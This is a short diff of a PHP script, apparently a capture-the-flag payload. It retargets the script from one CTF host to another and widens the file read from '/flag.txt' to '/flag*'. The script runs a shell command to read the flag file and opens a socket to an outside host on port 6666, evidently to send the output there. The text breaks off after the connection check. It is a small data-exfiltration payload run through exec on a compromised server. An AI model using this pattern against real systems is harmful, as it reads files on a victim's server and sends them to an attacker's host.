@@ -1,8 +1,8 @@
 <?php
-$ip = 'intechfest.cc';  // Replace with the IP address
+$ip = 'ctf.tcp1p.com';  // Replace with the IP address
 $port = 6666;       // Replace with the port number
 
-exec("cat /flag.txt", $message);  // The text message you want to send
+exec("cat /flag*", $message);  // The text message you want to send
 
 $socket = fsockopen($ip, $port, $errno, $errstr, 30);
 if (!$socket) {
